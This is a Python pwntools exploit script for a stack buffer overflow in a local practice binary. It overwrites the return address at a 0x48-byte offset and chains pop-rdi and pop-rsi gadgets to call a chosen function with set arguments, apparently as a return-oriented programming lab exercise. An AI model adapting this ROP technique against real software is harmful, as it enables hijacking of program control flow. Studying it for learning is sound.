#!/usr/bin/env python3

from pwn import *

# Print byte array as hex string "\x..\x..\x.."
def print_byte_array(prefix, array):
    log.info("{}: {}".format(prefix, "".join("\\x{:02x}".format(array[i]) for i in range(0, len(array)))))


# Change to 'debug' for extensive information on classes used.
context.log_level = 'info'

filename = "../src/vuln64"
e = ELF(filename)
context.binary = filename
#context.arch = "amd64"
diablo_address = e.symbols[b"diablo"]
overwatch_address = e.symbols[b"overwatch"]
warcraft_address = e.symbols[b"warcraft"]
starcraft_address = e.symbols[b"starcraft"]
pop_rdi_ret_gadget_address = 0x0000000000400713
pop_rsi_r15_gadget_address = 0x0000000000400711

print("diablo: 0x{:016x}".format(diablo_address))
print("warcraft: 0x{:016x}".format(warcraft_address))
print("overwatch: 0x{:016x}".format(overwatch_address))
print("starcraft: 0x{:016x}".format(starcraft_address))

# buffer is at rbp-0x40
# return address is at rbp+0x8
offset = 0x48
#payload = offset * b"A" + pack(warcraft_address)
#payload = offset * b"A" + pack(pop_rdi_ret_gadget_address) + pack(0xdeadbeef) + pack(overwatch_address)
payload = offset * b"A" + pack(pop_rdi_ret_gadget_address) + pack(0x12345678) + pack(pop_rsi_r15_gadget_address) + pack(0xaabbccdd) + pack(0) + pack(diablo_address)

# It won't work. Payload is too large.
#payload = offset * b"A" + pack(pop_rdi_ret_gadget_address) + pack(0xdeadbeef) + pack(overwatch_address) + pack(pop_rdi_ret_gadget_address) + pack(0x12345678) + pack(pop_rsi_r15_gadget_address) + pack(0xaabbccdd) + pack(0) + pack(diablo_address)

"""

----
bufffer
....
....
-----
saved rbp
-----
pop_rdi_ret                      -----> pop rdi (mov rdi, [rsp] + add rsp, 8)        ret
-----
0x000000000deadbeef (pop rdi)
-----
overwatch_address (ret)
-----
"""

print_byte_array("payload", payload)

p = process(filename)
p.readline()
p.sendline(payload)
p.interactive()
